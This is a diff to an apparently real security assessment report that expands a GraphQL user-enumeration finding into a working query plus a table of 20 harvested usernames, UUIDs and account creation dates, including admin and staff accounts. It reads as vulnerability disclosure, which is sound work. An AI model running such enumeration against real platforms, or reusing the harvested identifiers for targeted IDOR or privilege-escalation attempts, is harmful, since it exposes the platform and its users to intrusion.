@@ -44,16 +44,40 @@ access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
 
 ## FINDING 3: User Enumeration via GraphQL [HIGH]
 
-**Query:** `{ user(name: "<username>") { id name } }`
+**Query:** `{ user(name: "<username>") { id name createdAt } }`
 
-**Verified Results:**
-| Username | Response | User ID |
-|----------|----------|---------|
-| admin | EXISTS | `3c36bb00-7770-4f28-ab19-83a6860fe8ae` |
-| Support | EXISTS | `de4750df-a8b4-4cca-926a-cb123d23c6f6` |
-| nonexistentuser12345xyz | `null` | N/A |
+**Verified Results — 20/20 usernames resolved (100% success rate):**
 
-**Impact:** Attacker can enumerate all users, confirm account existence, and harvest UUIDs.
+| # | Username | User ID (UUID) | Account Created |
+|---|----------|---------------|-----------------|
+| 1 | admin | `3c36bb00-7770-4f28-ab19-83a6860fe8ae` | Wed, 02 Aug 2017 04:43:51 GMT |
+| 2 | Support | `de4750df-a8b4-4cca-926a-cb123d23c6f6` | Thu, 03 Aug 2017 09:57:45 GMT |
+| 3 | stake | `4df8ddca-0bab-48a2-be27-19883d584622` | Wed, 02 Aug 2017 02:27:46 GMT |
+| 4 | Eddie | `4fdfcbbe-f56e-4e88-a703-fdcf92ca026f` | Mon, 04 Sep 2017 23:25:18 GMT |
+| 5 | Drake | `2f0b2d72-bca4-4f22-86f8-ae7b8498338f` | Mon, 11 Sep 2017 04:41:33 GMT |
+| 6 | Rodiium | `9fe89874-81b7-484b-b688-b60fc0f723eb` | Tue, 24 Nov 2020 11:03:48 GMT |
+| 7 | Badebhaiya77 | `57edc195-883a-4ea2-95e0-6f4eb4f977db` | Thu, 20 Mar 2025 16:55:14 GMT |
+| 8 | GWL10000 | `60eea4a9-ce2b-48ed-a72a-ffd50beecd99` | Fri, 05 Dec 2025 03:44:29 GMT |
+| 9 | Arabicansut | `ceaeee9f-b8f3-4c8b-8541-77deedd60faa` | Fri, 30 Jan 2026 18:47:06 GMT |
+| 10 | 10111821 | `ae4cd256-11a0-4356-aaef-0b0d28e8b42c` | Fri, 18 Oct 2024 08:32:36 GMT |
+| 11 | ucwnono | `fd078835-8791-499d-96ab-6802bfbc8add` | Fri, 06 Nov 2020 18:24:45 GMT |
+| 12 | Umang1965 | `b7bb82ff-55cb-4dab-b4f8-bd906d129452` | Tue, 30 Apr 2024 13:00:59 GMT |
+| 13 | test | `a2031adc-78b5-4d78-a83d-c023a27ca252` | Thu, 10 Aug 2017 15:27:25 GMT |
+| 14 | Moderator | `096a140b-3256-4c95-8bb8-692b6e5da04f` | Wed, 02 Aug 2017 04:46:40 GMT |
+| 15 | vip | `eec0da38-e352-415c-b606-f2a16fd1479e` | Sat, 26 Aug 2017 19:17:54 GMT |
+| 16 | Whale | `e89d9015-2ef2-4645-a37d-561670aa180c` | Fri, 11 Aug 2017 06:12:04 GMT |
+| 17 | staff | `b3b4c225-f281-45d5-8f5c-0bed597ca999` | Tue, 22 Oct 2019 19:54:49 GMT |
+| 18 | security | `6ce98426-770b-4cce-a0a6-fc9c89c118b0` | Sun, 15 Oct 2017 17:54:21 GMT |
+| 19 | Ceo | `f1daa7ed-3c2b-43e5-8769-a7b5f5fc0a41` | Sat, 20 Apr 2019 00:54:22 GMT |
+| 20 | Developer | `47570c5d-ffab-496c-9366-91b0a2aa5ea4` | Wed, 17 Apr 2019 01:37:40 GMT |
+
+**Impact:**
+- 20/20 usernames tested resolved to real accounts (100% success rate)
+- Critical platform accounts exposed: admin, Support, Moderator, staff, security, Ceo, Developer
+- UUIDs enable targeted IDOR attacks and privilege escalation attempts
+- Account creation dates reveal platform internals (earliest: Aug 2, 2017)
+- No rate limiting observed — attacker can enumerate ALL platform users at scale
+- All data accessible cross-origin without any authentication
 
 ---
 
